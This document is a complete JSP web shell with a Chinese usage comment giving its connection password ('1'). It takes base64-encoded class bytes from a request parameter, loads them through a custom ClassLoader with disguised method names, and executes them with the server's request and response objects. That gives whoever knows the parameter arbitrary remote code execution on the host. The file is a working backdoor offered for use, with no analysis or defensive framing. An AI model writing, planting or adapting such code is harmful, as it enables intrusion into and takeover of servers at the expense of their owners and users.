<%-- 使用时请删除此行, 连接密码: 1 --%>
<%!
class AUGMENTED extends ClassLoader{
  AUGMENTED(ClassLoader c){super(c);}
  public Class datagram(byte[] b){
    return super.defineClass(b, 0, b.length);
  }
}
public byte[] regular(String str) throws Exception {
  Class base64;
  byte[] value = null;
  try {
    base64=Class.forName("sun.misc.BASE64Decoder");
    Object decoder = base64.newInstance();
    value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {String.class }).invoke(decoder, new Object[] { str });
  } catch (Exception e) {
    try {
      base64=Class.forName("java.util.Base64");
      Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
      value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
    } catch (Exception ee) {}
  }
  return value;
}
%>
<%
String cls = request.getParameter("1");
if (cls != null) {
  new AUGMENTED(this.getClass().getClassLoader()).datagram(regular(cls)).newInstance().equals(new Object[]{request,response});
}
%>
